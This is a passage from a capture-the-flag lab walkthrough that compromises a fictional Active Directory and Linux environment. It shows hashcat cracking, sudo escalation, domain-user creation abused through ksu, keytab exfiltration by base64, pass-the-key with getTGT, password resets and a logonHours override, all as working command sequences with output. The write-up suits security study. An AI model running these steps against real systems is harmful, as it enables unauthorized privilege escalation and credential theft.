➜ hashcat -a 0 -m 3200 /tmp/hash.txt /opt/SecLists/rockyou.txt -d 1

..[snip]...
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$mRCQxe/f5AEhuyi1sZKoyuOCfUeAroZ/dDhOgrUcrGCR...pfnRRi

...[snip]...
$2y$10$mRCQxe/f5AEhuyi1sZKoyuOCfUeAroZ/dDhOgrUcrGCRxqRpfnRRi:Password123
```

*Running a dictionary attack against rockyou cracks d.reynolds' bcrypt hash to `Password123`. The other hashes are students — not our privilege target.*

The `accountType` field is the triage key — crack the **Staff** entries first; students are noise for privilege purposes.

`d.reynolds` — flagged **Staff,Administrators** in the portal, and on the Linux side we switch into that account with the cracked password:

```bash
e.mitchell@web:~$ su - d.reynolds
Password:
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

d.reynolds@web:~$ whoami && id
d.reynolds
uid=1002(d.reynolds) gid=1003(d.reynolds) groups=1003(d.reynolds),27(sudo),1004(linuxadmins)
```

*`su - d.reynolds` with `Password123` lands us in d.reynolds' shell; `id` shows group `27(sudo)` — the key to root. This is **Flag3 path one** so far.*

Check what d.reynolds can sudo, then escalate to root:

```bash
d.reynolds@web:~$ sudo -l
[sudo] password for d.reynolds:
Matching Defaults entries for d.reynolds on web:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User d.reynolds may run the following commands on web:
    (ALL : ALL) ALL

d.reynolds@web:~$ sudo -i

root@web:~# whoami && id
root
uid=0(root) gid=0(root) groups=0(root)
```

*`sudo -l` reveals `(ALL : ALL) ALL` — unrestricted sudo. `sudo -i` drops us into a root shell. Path one complete.*

Capture the flag:

```bash
root@web:~# cat flag.txt
Flag03[WEB_XXXXX_XXX_Backup]
```

**Flag 3 — path one.** Plain old Linux privesc: reused password, sudo group, game over.

## 14.5 Kerberos as the Privilege Escalation

> **The alternate path to root.** This is **Flag3 — path two**: instead of cracking d.reynolds and riding `sudo` ([Section 14.4](#144-password123--dreynolds-sudo-to-root)), we abuse AD-on-Linux directly. No password cracking, no sudo group — just a Kerberos principal mapped onto the local `root` account.

![BloodHound — m.thompson GenericAll over the STUDENTS OU](/assets/images/westbridge-bh-mthompson-genericall-students.png)

Ref: [Section 8.4](#84-non-default-acl-edges)

This is the elegant path, and it's pure AD-on-Linux — and it was a *first-class* option from the moment we had the [Section 7.3 BloodHound collection](#73-bloodhound-collection): m.thompson's GenericAll over the STUDENTS OU already showed we could create users there, and the WEB box's SSSD `ksu` behavior is visible the instant you look at how the lab joins Linux to the domain. The lab may have intended this as a bonus, but recon surfaced it as directly as any other edge. m.thompson still holds GenericAll over the Students OU — which means **creating brand-new domain users** in it:

```bash
➜ bloodyAD --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
    -u m.thompson -p 'Pa$$w0rd' \
    add user root 'SecretMyth123!' \
    --ou 'OU=Students,DC=westbridge,DC=hsm'

[+] root created
```

*`bloodyAD add user root` exercises the CreateChild right m.thompson inherited over the STUDENTS OU — proven earlier in [Section 11.2](#112-execution--rights-live-on-containers-not-people) via `get writable` (`CREATE_CHILD; WRITE` on `OU=STUDENTS`). We mint a domain account named `root` so the WEB box's `ksu` can later map it onto the local `root`.*

Now, from the *unprivileged* svc_web shell on WEB — no sudo involved:

```bash
svc_web@westbridge.hsm@web:~$ kinit root@WESTBRIDGE.HSM
Password for root@WESTBRIDGE.HSM:                            #passwd: SecretMyth123!
Warning: Your password will expire in less than one hour on Tue Sep 14 02:48:05 2100

svc_web@westbridge.hsm@web:~$ ksu root -n root@WESTBRIDGE.HSM
Authenticated root@WESTBRIDGE.HSM
Account root: authorization for root@WESTBRIDGE.HSM successful
Changing uid to root (0)

root@web:/home/svc_web@westbridge.hsm# whoami && id
root
uid=0(root) gid=0(root) groups=0(root)
```

*`kinit` obtains a TGT for the AD-minted `root@WESTBRIDGE.HSM` we created via m.thompson's GenericAll over the STUDENTS OU; `ksu root -n root@WESTBRIDGE.HSM` then authorizes that Kerberos principal against the local `root` account of the same name and switches uid to 0 — domain-side identity creation becomes local root on a domain-joined Linux box, with no sudo in the chain.*

Why this works: the box is domain-joined with SSSD, and `ksu` authorizes a Kerberos principal against a **local account of the same name**. We manufactured `root@WESTBRIDGE.HSM` in AD — the local `root` account completed the mapping. **Domain-side identity creation became local root on a Linux member.** Same flag, completely different lesson: on domain-joined Linux, *who exists in AD* is a privilege-escalation primitive.

## 14.6 Bonus Loot — Keytabs Everywhere

Root on WEB means linpeas runs with eyes. (One incidental note from the SUID sweep: `/usr/bin/ksu.mit` is present on the box — the exact binary the [Section 14.5](#145-kerberos-as-the-privilege-escalation) `ksu` privesc rode on — but a setuid sweep is unnecessary here since we're already root by two independent paths.) The real loot signal is linpeas' Kerberos section:

### 14.6.1 linpeas

```bash
╔══════════╣ Searching kerberos conf files and tickets (T1558.003)
kadmin was found on /usr/bin/kadmin
klist: No credentials cache found (filename: /tmp/krb5cc_0)
ptrace protection is enabled (1), you need to disable it to search for tickets inside processes memory

keytab file found, you may be able to impersonate some kerberos principals and add users or modify passwords
Keytab name: FILE:/etc/krb5.keytab
KVNO Principal
---- --------------------------------------------------------------------------
   2 WEB$@WESTBRIDGE.HSM
   2 host/WEB@WESTBRIDGE.HSM
   2 RestrictedKrbHost/WEB@WESTBRIDGE.HSM
   2 HTTP/supportportal.westbridge.hsm@WESTBRIDGE.HSM
   3 WEB$@WESTBRIDGE.HSM
   3 host/WEB@WESTBRIDGE.HSM
   3 RestrictedKrbHost/WEB@WESTBRIDGE.HSM
   3 HTTP/supportportal.westbridge.hsm@WESTBRIDGE.HSM
  --- Impersonation command: kadmin -k -t /etc/krb5.keytab -p "WEB$@WESTBRIDGE.HSM"
  --- Impersonation command: kadmin -k -t /etc/krb5.keytab -p "HTTP/supportportal.westbridge.hsm@WESTBRIDGE.HSM"
....
```

*linpeas' Kerberos section is the real loot signal. Two keytabs turn up: the box's own `/etc/krb5.keytab` (machine keytab) and the apache2 copy (`/etc/apache2/supportportal.keytab`) that Apache actually reads — both carrying `WEB$` / `host/WEB` / `RestrictedKrbHost/WEB` / `HTTP/supportportal.westbridge.hsm` at kvno 2 and 3 (the apache2 copy omitted for brevity since it's identical). The `HTTP/supportportal.westbridge.hsm` entry is the next-stage support portal.

```bash
-rw-r--r-- 1 root root 760 Aug 23 07:32 /etc/krb5.conf
[libdefaults]
    default_realm = WESTBRIDGE.HSM
    dns_lookup_realm = false
    dns_lookup_kdc = true
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true
    proxiable = true
    rdns = false
    kdc_timesync = 1
    ccache_type = 4
    udp_preference_limit = 0
    default_tgs_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96 rc4-hmac
    default_tkt_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96 rc4-hmac
    permitted_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96 rc4-hmac

[realms]
    WESTBRIDGE.HSM = {
        kdc = 10.0.10.5
        admin_server = 10.0.10.5
        default_domain = westbridge.hsm
    }

[domain_realm]
    .westbridge.hsm = WESTBRIDGE.HSM
    westbridge.hsm = WESTBRIDGE.HSM
```

*The `/etc/krb5.conf` linpeas captured: realm `WESTBRIDGE.HSM`, KDC `10.0.10.5` (the DC), ticket lifetime 24h. This is what every `-k` call below reads to locate the realm's KDC.*

```bash
-rw------- 1 root root 519 Aug  8 09:04 /etc/sssd/sssd.conf
[sssd]
domains = westbridge.hsm
config_file_version = 2
services = nss, pam

[domain/westbridge.hsm]
default_shell = /bin/bash
krb5_store_password_if_offline = True
cache_credentials = True
krb5_realm = WESTBRIDGE.HSM
realmd_tags = manages-system joined-with-adcli
id_provider = ad
fallback_homedir = /home/%u@%d
ad_domain = westbridge.hsm
use_fully_qualified_names = True
ldap_id_mapping = True
access_provider = ad

# Disable automatic machine-account password rotation
ad_maximum_machine_account_password_age = 0
```

*The SSSD config — and it confirms the [Section 14.2](#142-shell-as-svc_web--and-the-sssd-username-quirk) SSSD quirk outright: `use_fully_qualified_names = True` is exactly why `svc_web@westbridge.hsm` (not the bare `svc_web`) was required. And `ad_maximum_machine_account_password_age = 0` is why the **machine account's** key never rotates — the machine keytab (`/etc/krb5.keytab`) stays valid forever. The `svc_krb_t2` keytab below is a separate path: it stays valid because the account's key was never rotated — kvno 3 is still the live key the KDC holds.*

Root on WEB also means linpeas runs with eyes. Two service keytabs stand out — the machine keytab (`/etc/krb5.keytab`, `WEB$` + `HTTP/supportportal.westbridge.hsm`) and a dedicated provisioning identity we've never met:

**`/etc/svc_krb_t2.keytab`** — the *actual long-term key* of **svc_krb_t2**, the Tier-2 provisioning service account (the one with GenericAll over the IT TIER2 group). Exfil by base64 (it's tiny), then use it from the attacker box:

```bash
root@web:~# file /etc/svc_krb_t2.keytab
/etc/svc_krb_t2.keytab: Kerberos Keytab file, realm=WESTBRIDGE.HSM, principal=svc_krb_t2/, type=65536, date=Thu Jan  1 00:12:48 1970, kvno=18

root@web:~# md5sum /etc/svc_krb_t2.keytab
46a80173ad4532104c841adc1e035994  /etc/svc_krb_t2.keytab

root@web:~# base64 /etc/svc_krb_t2.keytab
BQIAAABLAAEADldFU1RCUklER0UuSFNNAApzdmNfa3JiX3QyAAAAAQAAAAADABIAIAAoC5VFjFon
nMRVXOxfD0nTD/LwVRwVW0SrQCvKd1pU
```

*`file` reports the keytab for principal `svc_krb_t2@WESTBRIDGE.HSM` — but note `file` reports `kvno=18`, which is libmagic's mis-parse of the MIT keytab layout; the canonical value is kvno 3 (`klist -k` is the canonical view, and it's the kvno `kinit -k -t` seals the AS-REQ with). `md5sum` so we can verify the exfil'd copy byte-for-byte; `base64` to exfil as text (it's tiny).*

```bash
➜ echo 'BQIAAABLAAEADldFU1RCUklER0UuSFNNAApzdmNfa3JiX3QyAAAAAQAAAAADABIAIAAoC5VFjFon
nMRVXOxfD0nTD/LwVRwVW0SrQCvKd1pU' | base64 -d > svc_krb_t2.keytab

➜ file svc_krb_t2.keytab
svc_krb_t2.keytab: Kerberos Keytab file, realm=WESTBRIDGE.HSM, principal=svc_krb_t2/, type=65536, date=Thu Jan  1 00:12:48 1970, kvno=18

➜ md5sum svc_krb_t2.keytab
46a80173ad4532104c841adc1e035994  svc_krb_t2.keytab

➜ klist -k svc_krb_t2.keytab
Keytab name: FILE:svc_krb_t2.keytab
KVNO Principal
---- --------------------------------------------------------------------------
   3 svc_krb_t2@WESTBRIDGE.HSM

➜ kinit -k -t svc_krb_t2.keytab svc_krb_t2@WESTBRIDGE.HSM

➜ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: svc_krb_t2@WESTBRIDGE.HSM

Valid starting       Expires              Service principal
08/23/2026 16:11:15  08/24/2026 02:11:15  krbtgt/WESTBRIDGE.HSM@WESTBRIDGE.HSM
        renew until 08/24/2026 16:11:15
```

## 14.7 svc_krb_t2.keytab — Exfil and Authenticate

**The other way in — same TGT, different tool.** The 14.6 path mints the `svc_krb_t2` TGT the keytab-binary way (`kinit -k -t svc_krb_t2.keytab`); this section covers the extract path — pull the raw AES-256 key out with `keytabextract` and hand it to `getTGT.py -aesKey`. Same identity (`svc_krb_t2`), same endpoint (a `svc_krb_t2` TGT in `svc_krb_t2.ccache`), two different clients. The full Kerberos mechanics — kvno, keytab-vs-ticket, the loot rule, and the migration story behind `svc_krb_t2`'s never-rotated key — is the [Cerberus in a File](/kerberos/cerberus-in-a-file/) deepdive.

The command block below is the **alternative** — same exfil, same decoded keytab, but instead of handing the file to `kinit`, we pull the raw AES-256 key out with `keytabextract` and hand *that* to `getTGT.py -aesKey`. Same identity (`svc_krb_t2`), same endpoint (a `svc_krb_t2` TGT in `svc_krb_t2.ccache`), two different clients:

- **Binary path** (`kinit -k -t svc_krb_t2.keytab`) — keytab as a **file**. Clean, fast, what the keytab exists for.
- **Extract path** (`keytabextract svc_krb_t2.keytab` → `getTGT.py -aesKey <key>`) — keytab as a **key source**. Surfaces the raw AES-256-CTS-HMAC-SHA1 key (`00280b95458c5a279cc4555cec5f0f49d30ff2f0551c155b44ab402bca775a54`) on your terminal; reach for it when you want the raw AES hash, or when `kinit -k -t` isn't the tool in hand.

**The hash is the interesting part.** `keytabextract` surfaces the AES-256 key directly — visible where `kinit -k -t` never shows it. That's the difference worth documenting in [Cerberus in a File](/kerberos/cerberus-in-a-file/).

```zsh
➜ keytabextract svc_krb_t2.keytab
[!] No RC4-HMAC located. Unable to extract NTLM hashes.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[!] Unable to identify any AES128-CTS-HMAC-SHA1 hashes.
[+] Keytab File successfully imported.
        REALM : WESTBRIDGE.HSM
        SERVICE PRINCIPAL : svc_krb_t2/
        AES-256 HASH : 00280b95458c5a279cc4555cec5f0f49d30ff2f0551c155b44ab402bca775a54
```

```zsh
➜ getTGT.py westbridge.hsm/svc_krb_t2 \
    -aesKey 00280b95458c5a279cc4555cec5f0f49d30ff2f0551c155b44ab402bca775a54

[*] Saving ticket in svc_krb_t2.ccache
```

*On the attacker box, decode the base64 back into `svc_krb_t2.keytab`. `kinit -k -t` uses the keytab directly (no password) to obtain a TGT for `svc_krb_t2` — proving it's a live identity. `klist` shows the freshly minted TGT.*

```bash
➜ env KRB5CCNAME=svc_krb_t2.ccache \
nxc smb dc.westbridge.hsm -k --use-kcache

SMB         dc.westbridge.hsm 445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:westbridge.hsm) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         dc.westbridge.hsm 445    DC               [+] WESTBRIDGE.HSM\svc_krb_t2 from ccache
```

*We point nxc at the DC with `-k --use-kcache` and the named ccache. It authenticates as `WESTBRIDGE.HSM\svc_krb_t2` with no password ever cracked. This keytab is the bridge into [Section 15](#15-helpdesk-ws--the-tier-2-play) (HELPDESK-WS).*

A full Kerberos identity for a Tier-2 account, no password ever cracked. The keytab primitive is covered in depth in [Cerberus in a File](/kerberos/cerberus-in-a-file/); who `svc_krb_t2` is and why it held GenericAll over IT TIER2 is covered where the account is first weaponised, in [Section 15.2](#152-svc_krb_t2-mints-itself-an-ou).

So [Section 14](#14-web--ssh-key--cron--and-a-kerberos-shortcut) ends with two independent routes to `root` on WEB *and* a third, quieter prize — a Tier-2 Kerberos identity that needs no cracking and no expiry. That keytab is what turns [Section 15](#15-helpdesk-ws--the-tier-2-play) from "we have a lead" into "we have the account."

## 14.8 Where This Leaves Us

| Host | Status | Flag |
|---|---|---|
| SQL 10.0.10.20 | SYSTEM | Flag01 |
| FILES 10.0.10.15 | local Administrator | Flag02 |
| WEB 10.0.10.10 | **root** (two independent paths) | **Flag03** |
| DC 10.0.10.5 | authenticated as 5+ identities | — |

Live threads into the endgame: `supportportal.westbridge.hsm` (new SPN), the **RESEARCH forest** (`svc_krb_t2` can write its DNS), hidden **RID 9510**, `j.walsh`'s uncracked MD5, and Domain Admin on the DC itself.

---

# 15. HELPDESK-WS — The Tier-2 Play

## 15.1 Scanning the Hidden Workstation

The hostname brute in [Section 8.2](#82-hosts-that-never-appeared-on-the-wire) already gave us the address; now it gets its scan:

```bash
PORT     STATE SERVICE       REASON  VERSION
3389/tcp open  ms-wbt-server syn-ack
| rdp-ntlm-info:
|   Target_Name: WESTBRIDGE
|   NetBIOS_Domain_Name: WESTBRIDGE
|   NetBIOS_Computer_Name: HELPDESK-WS
|   DNS_Domain_Name: westbridge.hsm
|   DNS_Computer_Name: HELPDESK-WS.westbridge.hsm
|   Product_Version: 10.0.26100
|_  System_Time: 2026-08-23T11:53:20+00:00
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=HELPDESK-WS.westbridge.hsm
| Issuer: commonName=HELPDESK-WS.westbridge.hsm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-14T16:04:49
| Not valid after:  2027-01-13T16:04:49
| MD5:     e1fa d9a6 7466 9102 fcb6 bd61 34ce b72f
| SHA-1:   83e4 0847 2c50 c26e 7a0c 8ba3 0a36 ca3e 0e7f d225
| SHA-256: ff07 fa76 5d90 4eb6 0340 ec00 6ca3 7ed5 58ab 9f32 fb2e 4d2b ab01 2516 a2ba 9cfc
...[snip]...
5985/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.991%I=7%D=8/23%Time=6A8ADF2E%P=x86_64-pc-linux-gnu%r(T
SF:erminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02
SF:\0\0\0");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s
```

Hosts entry before touching it — Kerberos and WinRM both want the FQDN:

```
10.0.10.25    HELPDESK-WS.westbridge.hsm HELPDESK-WS
```

Exactly what a workstation should look like: **RDP + WinRM only**. No web, no database, nothing to exploit remotely — this box will be entered *as a user*, not attacked as a service. Which raises the question: which user?

## 15.2 svc_krb_t2 Mints Itself an OU

The keytab identity from [Section 14.6](#146-bonus-loot--keytabs-everywhere) holds GenericAll over the IT TIER2 OU — but group membership alone doesn't put anyone in front of HELPDESK-WS. First, exercise that GenericAll into explicit ACE form (belt-and-braces for tooling that checks object ACLs rather than group rights):

`svc_krb_t2` holds GenericAll over the IT TIER2 OU — delegated rights that outlived the automation that justified them. That's the same pattern our whole chain keeps hitting: the deprecated proxy config ([Section 3.1](#31-information-disclosure--people-directoryconfbak)), the never-rotated machine password (`ad_maximum_machine_account_password_age = 0`), and now a forgotten provisioning identity with total control over a tier boundary.

Member of **TIER 2 PROVISIONING SERVICES**, and the edge we abuse:

![BloodHound — svc_krb_t2 group memberships](/assets/images/westbridge-bh-svckrbt2-membersof.png)
![BloodHound — svc_krb_t2 GenericAll over IT TIER2](/assets/images/westbridge-bh-svckrbt2-genericall-tier2.png)

And what can svc_krb_t2 *write*? bloodyAD's `get writable` answers:

* **`OU=IT Tier2` — CREATE_CHILD; WRITE; OWNER: WRITE; DACL: WRITE** (matches its GenericAll over the IT TIER2 OU — it can mint/modify Tier-2 identities)
* **CREATE_CHILD on the DNS zones — including `DC=westbridge-research.hsm`** — the *research forest's* DNS zone. Cross-forest staging rights, straight from a keytab we found on a web server.

First, convert the inherited `member` of `IT TIER2` group into a proper `GenericAll` ACE on the OU itself (the same defense-in-depth move we'll use later on IT TIER3):

```bash
➜ bloodyAD --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
    -u svc_krb_t2 \
    -k ccache=./svc_krb_t2.ccache \
    add genericAll 'OU=IT Tier2,DC=westbridge,DC=hsm' svc_krb_t2

[+] svc_krb_t2 has now GenericAll on OU=IT Tier2,DC=westbridge,DC=hsm
```

Then reset a Tier-2 member's password — s.harrison is the IT TIER2 user we're about to need:

```bash
➜ bloodyAD --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
    -u svc_krb_t2 \
    -k ccache=./svc_krb_t2.ccache \
    set password 's.harrison' 'SecretMyth123!'

[+] Password changed successfully!
```

Then the wall appears out of nowhere:

```bash
➜ nxc smb dc.westbridge.hsm \
    -u s.harrison -p 'SecretMyth123!'

SMB         10.0.10.5       445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:westbridge.hsm) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.0.10.5       445    DC               [-] westbridge.hsm\s.harrison:SecretMyth123! STATUS_INVALID_LOGON_HOURS
```

## 15.3 Why "Invalid Logon Hours"? — Time-Based Access Control

AD accounts carry a **`logonHours` attribute**: 21 bytes = 168 bits, one bit per hour of the week, enforced by the KDC/domain controller at every authentication. A helpdesk-tier account like s.harrison had been provisioned with restricted hours — staff work 9-to-5, so the account is *only allowed to log on* 9-to-5, regardless of correct credentials.

And we were attacking at the wrong time of day. Password right, logon refused anyway: `STATUS_INVALID_LOGON_HOURS`.

Who fixes logon-hour policies? The group we've been sitting next to since [Section 11](#11-mapping-the-ous--who-lives-where):

![BloodHound — Account Policy Administrators control IT Tier2 settings incl. logon restrictions](/assets/images/westbridge-bh-accountpolicy-logonhours.png)

**Account Policy Administrators** — c.wilson's group from our very first password reset. Its purpose, per the graph: managing account policy for IT TIER2 users, *"including logon restrictions and account settings"*. We reset c.wilson's password back then and never used it. Now it's exactly the right hammer.

(And why does the restriction exist at all? Same dead-migration pattern as before: Tier-2 staff accounts are provisioned conservatively — limited hours, standard-user defaults — and nobody revisits those settings when roles change. The policy isn't protecting anything anymore; it's just still there.)

## 15.4 Clearing the Hours

> In Windows, `STATUS_INVALID_LOGON_HOURS` isn't a hard stop. It's just a 21-byte hex string waiting to be zeroed out.

First look at what we're overwriting:

```bash
➜ bloodyAD \
    --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
    -u svc_krb_t2 \
    -k ccache=./svc_krb_t2.ccache \
    get object 's.harrison' \
    --attr logonHours --raw

distinguishedName: CN=s.harrison,OU=IT Tier2,DC=westbridge,DC=hsm
logonHours: AAAAAAAAAAAAAP8BAAAAAAAAAAAA
```

```bash
➜ echo '////////////////////////////' | base64 -d | xxd
00000000: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000010: ffff ffff ff                             .....
```

21 bytes, one bit per hour of the week. All-zeros (`AAAAAAAAAAAAAAAAAAAAAAAA`) means "never"; all-ones (`////////////////////////////`, base64 for 21×`\xFF`) means "always". s.harrison's current value is mostly-zero — restricted hours — and we want all-ones.

**Newer bloodyAD — one flag, no value:**

```bash
➜ bloodyAD \
    --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
    -u svc_krb_t2 \
    -k ccache=./svc_krb_t2.ccache \
    set object 's.harrison' 'logonHours' --raw

[+] s.harrison's logonHours has been updated
```

```bash
➜ bloodyAD \
    --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
    -u svc_krb_t2 \
    -k ccache=./svc_krb_t2.ccache \
    get object 's.harrison' \
    --attr logonHours --raw

distinguishedName: CN=s.harrison,OU=IT Tier2,DC=westbridge,DC=hsm
```

`--raw` with no value clears the restriction — bloodyAD pushes its all-`FF` preset and the attribute reads back empty.

**Older bloodyAD — value + `--b64`:**

The older form passed the value explicitly:

```bash
➜ bloodyAD \
    --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
    -u svc_krb_t2 \
    -k ccache=./svc_krb_t2.ccache \
    set object 's.harrison' 'logonHours' \
    -v '////////////////////////////' --b64

[!] Attribute encoding not supported for logonHours with bytes attribute type, using raw mode
[+] s.harrison's logonHours has been updated
```

```bash
➜ bloodyAD \
    --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
    -u svc_krb_t2 \
    -k ccache=./svc_krb_t2.ccache \
    get object 's.harrison' \
    --attr logonHours --raw

distinguishedName: CN=s.harrison,OU=IT Tier2,DC=westbridge,DC=hsm
logonHours: ////////////////////////////
```

`logonHours` is an **OctetString** — a fixed 21-byte binary blob. A bare string value (`-v '...' --raw`) bounces with `ERROR_NOT_SUPPORTED` because LDAP won't accept a text string in a binary-syntax attribute. With `--b64`, bloodyAD recognises it can't encode the value as bytes, falls back to raw mode, and pushes its own canonical all-`FF` octet string — the same end state the no-value `--raw` form reaches (see [bloodyAD issue #74](https://github.com/CravateRouge/bloodyAD/issues/74)). Both get there; `--raw` with no value is the shorter path in newer bloodyAD.

```bash
➜ nxc smb dc.westbridge.hsm \
    -u s.harrison -p 'SecretMyth123!'

SMB         10.0.10.5       445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:westbridge.hsm) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.0.10.5       445    DC               [+] westbridge.hsm\s.harrison:SecretMyth123!
```

Lesson: binary AD attributes like `logonHours` (syntax **OctetString**) reject bare string values; supply via `--b64` or let the tool push its all-`FF` preset with `--raw` (no value). Either lands.

## 15.5 Who Is s.harrison?

![BloodHound — s.harrison memberships](/assets/images/westbridge-bh-sharrison-membersof.png)

BloodHound shows s.harrison sitting in two groups that matter for this engagement:

* **Helpdesk Technicians** — the helpdesk-tier identity, consistent with a Tier-2 provisioner account that's been provisioned conservatively (limited logon hours, standard-user defaults). This is the group s.harrison sat in when the `logonHours` restriction bit us in [Section 15.3](#153-why-invalid-logon-hours--time-based-access-control).
* **HelpDesk Workstation Admins** — the door key. This group exists precisely to administer machines like `HELPDESK-WS$` (10.0.10.25 — RDP/WinRM only). It's what turns a valid helpdesk credential into a workstation foothold.

The BloodHound graph also shows s.harrison's outbound edges — limited for a helpdesk-tier account, but the Workstation Admins membership is the one that matters.

LDAP confirms the same picture:

```bash
➜ nxc ldap dc.westbridge.hsm \
    -u s.harrison -p 'SecretMyth123!' \
    --groups

...[snip]...
LDAP        10.0.10.5       389    DC               Helpdesk Technicians                     1         Responsible for handling IT support tickets and user requests through the IT Support Portal.
...[snip]...
LDAP        10.0.10.5       389    DC               HelpDesk Workstation Admins              1
```

That second membership is the door key: **HelpDesk Workstation Admins** exists precisely to administer machines like `HELPDESK-WS$` (10.0.10.25 — RDP/WinRM only).

## 15.6 Foothold — Protocol Matrix, Then WinRM

Same ritual as every new credential — re-test every protocol against the new target:

```bash
➜ for proto in smb ldap winrm rdp; \
    do nxc $proto helpdesk-ws.westbridge.hsm -u s.harrison -p 'SecretMyth123!'; \
    echo '---';
done
---
---
WINRM       10.0.10.25      5985   HELPDESK-WS      [*] Windows 11 / Server 2025 Build 26100 (name:HELPDESK-WS) (domain:westbridge.hsm)
WINRM       10.0.10.25      5985   HELPDESK-WS      [+] westbridge.hsm\s.harrison:SecretMyth123! (Pwn3d!)
---
RDP         10.0.10.25      3389   HELPDESK-WS      [*] Windows 10 or Windows Server 2016 Build 26100 (name:HELPDESK-WS) (domain:westbridge.hsm) (nla:True)
RDP         10.0.10.25      3389   HELPDESK-WS      [+] westbridge.hsm\s.harrison:SecretMyth123! (Pwn3d!)
```

Both interactive protocols light up **`(Pwn3d!)`** — the Workstation Admins membership does exactly what its name promised. Straight into WinRM:

```bash
➜ evil_winrmexec \
    westbridge.hsm/s.harrison:'SecretMyth123!'@helpdesk-ws.westbridge.hsm

PS C:\Users\s.harrison\Documents> whoami; hostname
westbridge\s.harrison
HELPDESK-WS
```

```bash
PS C:\Users\s.harrison> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
... [22 further Enabled privileges elided — full list is a local-admin greatest-hits] ...
```

The privilege list reads like a local-admin greatest-hits — `SeDebugPrivilege`, `SeBackupPrivilege`/`SeRestorePrivilege`, `SeTakeOwnershipPrivilege`, `SeLoadDriverPrivilege`, `SeImpersonatePrivilege` all enabled. Any one of several of these is a local SYSTEM escalation if we ever need one (DiskShadow/vssadmin dump, load-driver abuse, potato variants). No need today — the flag is just sitting on the admin's desktop:

```powershell
PS > type C:\Users\Administrator\Desktop\flag.txt
Flag04[HELPXXXX_XXXXShell]
```
### 15.6.1 Foothold Achieved — Why HELPDESK-WS Matters

The flag says "local admin on a helpdesk workstation," but that undersells it. HELPDESK-WS is the **hinge** of the whole engagement, and the win isn't the box — it's what's *on* it:

- **The `C:\Support` toolbox** — a full library of AD one-liners (`Unlock-UserAccount.ps1`, `Reset-DomainDefaultPassword.ps1`, `domain_defaultPW.xml`). `domain_defaultPW.xml` is the credential we'll resurrect `a.pherson` with in [Section 16](#16-apherson--resurrecting-the-dead).
- **s.harrison's Support Portal shortcut** — our *only* window into the research forest. The helpdesk chat on that portal (next section) is the thread that pulls the entire WESTBRIDGE-RESEARCH.HSM side of the lab.

So Flag04 is where the chain splits in two: up into the DC (a.pherson ➜ tombstones ➜ ESC4), and across the trust (the portal ➜ group-scope abuse ➜ research forest). The workstation itself was never the target — it was the evidence locker.

A quick look at what else is local before we move on:

```bash
PS C:\> dir

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          4/1/2024   7:02 AM                PerfLogs
d-r---        11/14/2024   1:26 AM                Program Files
d-r---          4/1/2024   8:16 AM                Program Files (x86)
d-----         7/15/2026   4:37 PM                Support
d-r---         7/15/2026   4:22 PM                Users
d-----         8/23/2026   9:38 AM                Windows

PS C:\Users\s.harrison> tree . /a /f
Folder PATH listing for volume Windows
Volume serial number is 7EC2-1A39
C:\USERS\S.HARRISON
+---Contacts
+---Desktop
|       Microsoft Edge.lnk
|       ShellRunas.exe
|       Support Portal.url
|
+---Documents
+---Downloads
+---Favorites
\---Pictures
```

The only thing of interest on the desktop is **`Support Portal.url`** — the portal shortcut that becomes the [Section 15.7](#157-looking-around--the-support-portal) thread. (The rest of the profile — Contacts, Documents, Downloads, Favorites, Pictures — is empty.)

```bash
PS C:\support> tree Scripts Tools /a /f
C:\SUPPORT
+---Scripts
|   +---ActiveDirectory
|   |       Collect-SystemInfo.ps1
|   |       domain_defaultPW.xml
|   |       Get-ComputerInfo.ps1
|   |       Get-DomainUserInfo.ps1
|   |       Get-GroupMembership.ps1
|   |       Get-InstalledPrinters.ps1
